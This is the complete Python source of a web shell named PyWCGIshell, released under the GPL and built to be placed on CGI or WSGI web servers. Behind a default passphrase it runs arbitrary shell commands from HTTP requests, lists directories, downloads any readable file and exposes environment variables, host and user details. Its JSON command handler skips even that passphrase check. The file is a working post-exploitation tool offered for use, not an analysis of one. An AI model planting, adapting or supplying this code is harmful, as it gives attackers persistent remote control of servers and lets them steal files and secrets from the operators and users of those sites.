#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implement a WebShell for CGI and WSGI server.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""This package implement a WebShell for CGI and WSGI server."""

print(
    """
PyWCGIshell  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
)

__version__ = "0.0.1"
__all__ = ["WebShell"]

from os import getcwd, environ, path, scandir, _Environ
from sys import getdefaultencoding
from subprocess import Popen, PIPE, TimeoutExpired
from socket import gethostname, gethostbyname
from wsgiref.simple_server import make_server
from typing import List, TypeVar
from collections.abc import Callable
from base64 import b64encode
from getpass import getuser
import sysconfig
import platform
import locale
import json
import html
import sys
import re

BinaryListOrNone = TypeVar("BinaryListOrNone", List[bytes], None)

WEBSHELL_PAGE = f"""
<!DOCTYPE html>
<html>
    <head>
        <title>WebShell</title>
        <meta charset="utf-8">
        <script type="text/javascript">
            function download (data, file) {{
                link = document.createElement('a');
                link.setAttribute('href',
                    'data:application/octet-stream;base64, ' + data);
                link.setAttribute('download', file)
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }}

            function add_commmand_output(command, output) {{
                document.getElementById('history').innerHTML += '<button onclick="add_console_text(`' +
                    output + '`)">' + command + '</button><br>';
            }}

            function special_request(request_object, type) {{

                let data = {{"request type": type}};

                function send(data) {{
                    xhttp.open("POST", "", true);
                    xhttp.setRequestHeader("Accept", "application/json");
                    xhttp.setRequestHeader("Content-Type", "application/json");
                    xhttp.send(data);
                }}

                let xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {{
                    if (xhttp.readyState == 4 && xhttp.status == 200) {{
                        if (type == "command") {{
                            let console_text = `>>> ${{request_object}}${{String.fromCharCode(10)}}${{xhttp.responseText}}`;
                            add_console_html(console_text);
                            add_commmand_output(request_object, console_text);
                        }} else if (type == "file") {{
                            let filename = request_object.split('/');
                            filename = filename[filename.length - 1]
                            download(xhttp.responseText, filename);
                        }} else if (type == "directory") {{
                            document.getElementById('explorer').innerHTML = xhttp.responseText;
                        }}
                    }}
                }};

                if (type == "command") {{
                    data["command"] = request_object;
                }} else if (type == "file") {{
                    data["filename"] = request_object;
                }} else if (type == "directory") {{
                    data["directory"] = request_object;
                }}

                data = JSON.stringify(data);
                send(data);
            }}

            function env_click(text, id) {{
                if (document.getElementById(id).innerHTML == "") {{
                    document.getElementById(id).innerHTML += text;
                }} else {{
                    document.getElementById(id).innerHTML = "";
                }}
            }}

            function add_console_html(text) {{
                let console_ = document.getElementById("console");
                console_.innerHTML = `${{text}}${{String.fromCharCode(10)}}${{console_.innerHTML}}`;
            }}

            function add_console_text(text) {{
                let console_ = document.getElementById("console");
                console_.innerText = `${{text}}${{String.fromCharCode(10)}}${{console_.innerText}}`;
            }}

            function console_clear() {{
                console_ = document.getElementById("console");
                console_.innerHTML = ``;
            }}

            function history_clear() {{
                console_ = document.getElementById("history");
                console_.innerHTML = ``;
            }}
        </script>

        <style type="text/css">
            body {{
                background-color: #222222;
                color: #EE1111
            }}

            button {{
                background-color: #444444;
                color: #EE1111
            }}

            input {{
                background-color: #444444;
                color: #FF2222
            }}

            .center {{
                text-align: center;
                width: 50%
            }}

            .right {{
                text-align: right;
                width: 25%
            }}

            .left {{
                text-align: left;
                width: 25%
            }}

            table, td, tr {{
                margin: 0.5%;
                padding: 0.5%
            }}

            .case_container {{
                vertical-align: top
            }}

            pre {{
                margin-top: 0%;
                tab-size: 4;
                background-color: black;
                color: white;
                font-family: "Courier", "Lucida Console", "Consolas", "sans-serif";
                font-size: 100%;
                float: inline-start
            }}
        </style>
    </head>
    <body>
        <table style="width=100%">
            <tr>
                <td class="left">
                    <p>
                        <b>Current directory:</b> {getcwd()}
                        <br>
                        <b>Filename:</b> {path.basename(__file__)}
                        <br>
                        <b>File directory:</b> {path.dirname(__file__)}
                    </p>
                </td>
                <td class="center"> <h1>PyWCGIshell: WebShell</h1> </td>
                <td class="right">
                    <p>""" + f"""
                        <b>Hostname:</b> {gethostname()}
                        <br>
                        <b>IP:</b> {gethostbyname(gethostname())}
                    </p>
                </td>
            </tr>

            <tr>
                <td class="left">
                    <p>
                        <b>Plateform:</b> {sysconfig.get_platform()}
                        <br>
                        <b>System:</b> {platform.platform()}
                        <br>
                        <b>Byte order: </b> {sys.byteorder}
                        <br>
                        <b>Default encoding: </b> {getdefaultencoding()}
                        <br>
                        <b>Preferred encoding: </b> {locale.getpreferredencoding()}
                    </p>
                </td>
                <td class="center">
                    <b>Command:</b> <input width="250" type="text" id="command">
                    <input type="button" value="Send" onclick="special_request(document.getElementById('command').value, 'command')">
                </td>
                <td class="right">
                    <p>
                        <b>User:</b> {getuser()}
                        <br>
                        <b>Python version:</b> {sysconfig.get_python_version()}
                        <br>
                        <b>Python path: </b> {sys.executable}
                        <br>
                        <b>Arguments:</b> {html.escape(" ".join(sys.argv[1:]))}
                    </p>
                </td>
            </tr>

            <tr>
                <td class="left">
                    %s
                </td>
                <td class="left case_container">
                    <pre><code id="console"></code></pre>
                </td>
                <td id="history" class="right case_container">
                </td>
            </tr>
            <tr>
                <td class="left">
                    <button onclick="console_clear()">Clear Console</button>
                    <button onclick="history_clear()">Clear History</button>
                </td>
                <td id="explorer" class="center">

                </td>
                <td class="right">
                    <button onclick="special_request('/', 'directory')">Root directory (/)</button>
                </td>
            </tr>
        </table>
    </body>
</html>
""" % "".join(
    f'<button onclick=\'env_click("{html.escape(value)}", "pre_{key}")\'>{key}'
    f'</button><br><pre id="pre_{key}"></pre><br><br>'
    for key, value in environ.items()
)

WEBSHELL_PAGE = WEBSHELL_PAGE.replace("\\", "/")


class WebShell:

    """This class implement a complete webshell with the default page,
    webshell page, server type, access to webshell...

    type: the type of server (must be "cgi" or "wsgi", default="cgi")
    passphrase: your passphrase to get the webshell (default="$HELL")
    pass_type: location for the passphrase:
            [ "url" passphrase match if in "<servername>:<port><path><query string>",
              "body" passphrase match if in content,
              "arguments" passphrase match if in arguments names or values,
              [CGI] "header_value" passphrase match if in Cookie, Referer, UserAgent or Accept
              [WSGI] "header_value" passphrase match if in Cookie, Connection,
                  UserAgent, Accept language, Accept encoding or Accept
              "method" if passphrase is request method ]
    """

    def __init__(self):
        self.type = "cgi" or "wsgi"
        self.passphrase = "$HELL"
        self.pass_type = "url" or "body" or "arguments" or "header_value" or "method"
        self.environ = environ

    def get_url(self) -> str:

        """This function return the URL and set self.url."""

        if self.type == "cgi":
            path = self.environ["SCRIPT_NAME"]
        elif self.type == "wsgi":
            path = self.environ["PATH_INFO"]

        self.url = f'{self.environ["SERVER_NAME"]}:{self.environ["SERVER_PORT"]}{path}?{self.environ["QUERY_STRING"]}'
        return self.url

    def get_method(self) -> str:

        """This function return the request method and set self.method."""

        self.method = self.environ["REQUEST_METHOD"]
        return self.method

    def get_headers(self) -> set:

        """This function return a set of headers and define self.headers."""

        self.headers = {
            self.environ["HTTP_ACCEPT"],
            self.environ["HTTP_USER_AGENT"],
            self.environ["HTTP_COOKIE"],
        }

        if self.type == "cgi":
            self.headers.add(self.environ["HTTP_REFERER"])
        elif self.type == "wsgi":
            self.headers.add(self.environ["HTTP_ACCEPT_LANGUAGE"])
            self.headers.add(self.environ["HTTP_ACCEPT_ENCODING"])
            self.headers.add(self.environ["HTTP_CONNECTION"])

        return self.headers

    def get_arguments(self) -> set:

        """This function return a set of arguments and define self.arguments."""

        self.arguments = re.split("=|&", self.environ["QUERY_STRING"])
        return self.arguments

    def get_body(self) -> str:

        """This function return the body and set self.body."""

        content_size = self.environ.get("CONTENT_LENGTH", "0")

        if content_size.isdigit():
            content_size = int(content_size)
        else:
            content_size = 0

        if self.type == "cgi":
            self.body = sys.stdin.read(content_size)
        elif self.type == "wsgi":
            self.body = self.environ["wsgi.input"].read(content_size)

        return self.body

    def get_access(self) -> bool:

        """This function return True if the passphrase
        is in request or False."""

        if self.pass_type == "url":
            return self.passphrase in self.url

        elif self.pass_type == "body":
            return self.passphrase in self.body

        elif self.pass_type == "method":
            return self.passphrase == self.method

        elif self.pass_type == "header_value":
            for header in self.headers:
                if self.passphrase in header:
                    return True
            return False

        elif self.pass_type == "arguments":
            return self.passphrase in self.arguments

    def get_type_page(self) -> BinaryListOrNone:

        """This function define the request type: standard page,
        command request, visit directory or WebShell page."""

        if self.environ["HTTP_ACCEPT"] == "application/json":
            self.body_object = json.loads(self.body)
            request_type = self.body_object.get("request type")

            if request_type == "file":
                self.get_file()
            elif request_type == "directory":
                self.visit_directory()
            elif request_type == "command":
                self.execute_command()

            return self.send_page()

        if self.get_access():
            self.get_webshell_page()
            return self.send_page()
        else:
            return self.standard_page()

    def run(
        self, environ: _Environ = None, responder: Callable = None
    ) -> BinaryListOrNone:

        """Run WebShell server."""

        if self.type == "wsgi":
            self.responder = responder
            self.environ = environ

        self.get_url()
        self.get_method()
        self.get_headers()
        self.get_arguments()
        self.get_body()

        return self.get_type_page()

    def send_page(self) -> BinaryListOrNone:

        """This funtion send page."""

        if self.type == "cgi":
            for header in self.response_headers:
                print(":".join(header))
            print("")
            print(self.page)
        elif self.type == "wsgi":
            self.responder("200 OK", self.response_headers)
            return [self.page.encode()]

    def get_webshell_page(self) -> str:

        """This function return the WebShell page."""

        self.page = WEBSHELL_PAGE
        self.response_headers = [("Content-Type", "text/html; charset=utf-8")]

    def try_decoding(self, data: bytes) -> str:

        """This function decode bytes and return it as html string."""

        string = ""
        for car in data:
            if car < 128:
                string += chr(car)
            else:
                string += "?"

        return string

    def execute_command(self) -> str:

        """This function execute command and return the output."""

        command = self.body_object["command"]
        timeout = self.body_object.get("timeout")

        process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)

        try:
            stdout, stderr = process.communicate(timeout=timeout)
        except TimeoutExpired:
            process.terminate()
            process.kill()
            stdout, stderr = process.communicate()

        output = self.try_decoding(stdout + b"\n\r" + stderr)

        self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
        self.page = html.escape(output.strip())

    def visit_directory(self) -> str:

        """This function list files and directory and return it."""

        directory = path.normpath(self.body_object.get("directory"))
        self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
        self.page = ""

        for element in scandir(path=directory):
            if element.is_file():
                self.page += f"""
                    <button onclick="special_request('{path.join(getcwd(), element.path)}', 'file')">
                        {element.name}
                    </button>
                """.replace(
                    "\\", "/"
                )

            elif element.is_dir():
                self.page += f"""
                    <button onclick="special_request('{path.join(getcwd(), element.path)}', 'directory')">
                        {element.name}
                    </button>
                """.replace(
                    "\\", "/"
                )

    def get_file(self) -> str:

        """This function send content file."""

        filename = path.normpath(self.body_object.get("filename"))

        with open(filename, mode="rb") as file:
            data = file.read()

        self.page = b64encode(data).decode()
        self.response_headers = [
            ("Content-Type", "application/octet-stream; base64"),
            (
                "Content-Disposition",
                f'attachment; filename="{path.basename(filename)}"',
            ),
        ]

    def standard_page(self) -> BinaryListOrNone:

        """Content of this function must be the default page or call it."""

        self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
        self.page = """<html><head><meta charset='utf-8'></head>
            <body><h1>WebShell (default page)</h1><a id="link">Click here</a>
            <script>document.getElementById('link').href=window.location.href+'?$HELL'
            </script></body></html>"""

        return self.send_page()


def launch_wsgi():

    """Default wsgi launcher."""

    INTERFACE = "127.0.0.1" or ""
    PORT = 8000 or 80 or 443
    httpd = make_server(INTERFACE, PORT, webshell.run)
    httpd.serve_forever()


if __name__ == "__main__":
    webshell = WebShell()

    if "wsgi" in sys.argv:
        from webbrowser import open as webopen

        webshell.type = "wsgi"
        webopen("http://127.0.0.1:8000/")
        launch_wsgi()
    elif webshell.type == "wsgi":
        launch_wsgi()
    elif webshell.type == "cgi":
        try:
            webshell.run()
        except KeyError:
            print('ERROR: To try this WebShell in WSGI mode add "wsgi" as argument.')
            print('Use: "python3 -m PyWCGIshell wsgi" to try this WebShell')
